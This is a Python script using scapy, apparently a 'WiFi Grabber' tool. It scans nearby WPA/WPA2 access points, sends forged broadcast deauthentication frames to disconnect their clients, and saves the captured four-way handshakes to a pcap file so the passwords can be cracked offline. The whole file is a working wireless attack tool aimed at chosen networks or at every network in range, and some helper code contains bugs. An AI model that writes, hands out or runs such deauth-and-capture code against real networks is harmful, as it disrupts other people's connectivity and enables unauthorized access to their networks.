#!/usr/bin/env python

"""
This script will do the following:
* Scan for every AP around
* Send deauth packets to a list of the found APs
* Capture the handshake and write it to a file

"""

from scapy.all import *
import sys
import os
from multiprocessing import Process
import time
import random
load_contrib("wpa_eapol")


iface = ""
verbose = 0
duration = 4
WPA_KEY_INFO_INSTALL = 64
WPA_KEY_INFO_ACK = 128
WPA_KEY_INFO_MIC = 256



if len(sys.argv) > 1:
  iface = sys.argv[1]
else:
  iface = "wlx00c0ca7bbc92"


# list of all APs, holding a dict for each one
aps = []


# Every second it switches randomly channels from 1-14
def rand_channel():
  while True:
    try:
      # pick random channel from 1 to 14
      rand = random.randrange(1, 15)
      os.system("sudo iwconfig {} channel {}".format(iface, rand))
      #switch_channel(rand)
      time.sleep(1)
    except KeyboardInterrupt:
      break
    except:
      print("[!!] Error in rand_channel()!")
      break


def switch_channel(channel_num):
    os.system("sudo iwconfig {} channel {}".format(iface, channel_num))


# Returns one of the following values: WPA, WPA2, WEP, OPN
def get_encryption(pkt):
  try:
    p = pkt[Dot11Elt]
    p = p.getlayer(Dot11Elt)
    ("{Dot11ProbeResp:%Dot11ProbeResp.cap%}").split('+')
    crypto = set()

    cap = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}")
    i = 0
    while i < 10 and isinstance(p, Dot11Elt):
      i += 1
      if p.ID == 48:
        crypto.add("WPA2")
      elif p.ID == 221 and p.info.startwith(b"\x00P\x0f\x01\x01\x00"):
        crypto.add("WPA")
    if not crypto:
      if "privacy" in cap:
        crypto.add("WEP")
      else:
        crypto.add("OPN")
  except Exception as e:
    pass

  if crypto:
    return "/".join(crypto)
  else:
    return ""



def is_wpa(pkt):
  if pkt.haslayer(Dot11Beacon):
    try:
      nstats = pkt[Dot11Beacon].network_stats()
      if "WPA" in nstats["crypto"]:
        return True
    except Exception as e:
      print(e)

  out = get_encryption(pkt)
  # Currently we have to check also for WEP, as
  # this is the only thing returned by get_encryuption
  # if the WiFi is encrypted at all (WPA/WPA2/WEP)
  if "WPA" in out or "WEP" in out:
    return True
  else:
    return False



  

# Scan for APs, check if it uses WPA/WPA2
# And if yes, it adds it to the list
def scan_for_aps():
  def PacketHandler(pkt):
    if is_wpa(pkt) == True:
      if pkt.haslayer(Dot11Beacon):
        # we can get a  handshake for this one
        ap = {}
        for a in aps:
          if pkt.addr3 == a["bssid"]:
            return 
        ap["bssid"] = pkt.addr3
        ap["ssid"]  = pkt.info  #netstats["ssid"]
        try:
          ap["chan"]  = ord(pkt[Dot11Elt:3].info)  #netstats["channel"]
        except:
          return
        
        aps.append(ap)       
        print("[{}]\tMAC: {}\tChan: {}  \tSSID: {}".format(len(aps)-1, ap["bssid"], ap["chan"], ap["ssid"]))

  try:
    sniff(iface=iface, prn=PacketHandler, lfilter=lambda pkt:  (Dot11Beacon in pkt or Dot11ProbeResp in pkt))
  except KeyboardInterrupt:
    return


def sniff_handshake(bssid):
  beacons = []
  ap_beacon_list = []
  wpa_handshakes = {}

  def PacketHandler(pkt):
    # Got EAPOL KEY packet
    if pkt.haslayer(WPA_key):
      layer = pkt.getlayer(WPA_key)
      print("[DBG] packet has layer WPA_key")
      # Parse source and destination of frame
      if (pkt.FCfield & 1):
        station = pkt.addr2 # From station - FromDS=0, ToDS=1
      elif (pkt.FCfield & 2):
        station = pkt.addr1 # From AP - FromDS=1, ToDS=0 
      else:
        return

      if pkt.addr3.upper() != bssid.upper():
        return

      if not wpa_handshakes.has_key(station):
        wpa_handshakes[station] = \
          {'ts':time.time(),'frame2':None,'frame3':None,'frame4':None,'replay_counter':None, 'packets':[]}
      else:
        if time.time()-duration > wpa_handshakes[station]['ts']:
          wpa_handshakes.pop(station, None)
          wpa_handshakes[station] = \
            {'ts':time.time(),'frame2':None,'frame3':None,'frame4':None,'replay_counter':None, 'packets':[]}
          if verbose > 1 : print("Resetting time for station {}".format(station))


      key_info = layer.key_info
      wpa_key_length = layer.wpa_key_length
      replay_counter = layer.replay_counter

      # Check for frame2
      if ((key_info & WPA_KEY_INFO_MIC) and (key_info & WPA_KEY_INFO_ACK == 0) \
      and (key_info & WPA_KEY_INFO_INSTALL == 0) and (wpa_key_length > 0)):
        print("[*] Found handshake frame 2 for AP: {} and station: {}".format(bssid, station))
        wpa_handshakes[station]['ts'] = time.time()
        wpa_handshakes[station]['frame2'] = 1
        wpa_handshakes[station]['packets'].append(pkt)
      
      # Check for frame3
      if ((key_info & WPA_KEY_INFO_MIC) and (key_info & WPA_KEY_INFO_ACK) \
      and (key_info & WPA_KEY_INFO_INSTALL)):
        print("[*] Found handshake frame 3 for AP: {} and station: {}".format(bssid, station))
        wpa_handshakes[station]['ts'] = time.time()
        wpa_handshakes[station]['frame3'] = 1
        wpa_handshakes[station]['replay_counter'] = replay_counter # store the replay counter for this station
        wpa_handshakes[station]['packets'].append(pkt)

      # Check for frame4
      if ((key_info & WPA_KEY_INFO_MIC) and (key_info & WPA_KEY_INFO_ACK == 0) \
      and (key_info & WPA_KEY_INFO_INSTALL == 0) and wpa_handshakes[station]['replay_counter'] == replay_counter):
        print("[*] Found handshake frame 4 for AP: {} and station: {}".format(bssid, station))
        wpa_handshakes[station]['ts'] = time.time()
        wpa_handshakes[station]['frame4'] = 1
        wpa_handshakes[station]['packets'].append(pkt)

     
      print("Key info: {}".format(key_info))

      # Check if all frames are present
      sta = wpa_handshakes[station]
      if (sta['frame2'] and sta['frame3'] and sta['frame4']):
        print("[*] Saving all frames of WPA handshake for AP: {} and Station: {}".format(bssid, station))
        pktdump.write(sta['packets'])
        if wpa_handshakes.has_key(station): wpa_handshakes.pop(station, None)

    elif pkt.haslayer(Dot11Beacon) and not pkt.addr3 in ap_beacon_list:
      if verbose: print pkt.summary()
      pktdump.write(pkt)
      ap_beacon_list.append(pkt.addr3)

  pktdump = PcapWriter("handshakes.pcap", append=True, sync=True)
  sniff(iface=iface, prn=PacketHandler, count=500, timeout=20)

def grab_handshake(target):
  ap = aps[target] 
  switch_channel(ap["chan"])
  count = 2
  conf.iface = iface
  print("[*] Sending Deauth packets to: {}".format(ap["bssid"]))
  packet = RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=ap["bssid"], addr3=ap["bssid"])/Dot11Deauth()
  packet2 = RadioTap()/Dot11(type=0, subtype=12, addr1="FF:FF:FF:FF:FF:FF", addr2=ap["bssid"], addr3=ap["bssid"])/Dot11Deauth(reason=7)
  p_mygrab = Process(target=sniff_handshake, args=(ap["bssid"],))
  p_mygrab.start()
  for n in range(count):
    for i in range(3):
      sendp(packet)
      sendp(packet2)
      time.sleep(2)
  p_mygrab.join()

def main():
  print("[*] Starting WiFi Grabber...")
  print("[*] Start Scanning on {}. Hit Ctrl-C to stop scanning.\n".format(iface))
  p = Process(target=rand_channel)
  p.start()
  scan_for_aps()
  p.terminate()
  p.join()

  target = raw_input("\nTarget: ")
  if "," in target:
    for t in target.split(","):
      grab_handshake(int(t))
  elif "all" in target:
    for i in range(len(aps)-1):
      grab_handshake(i)
  else:
    grab_handshake(int(target))
  

if __name__ == "__main__":
    main()
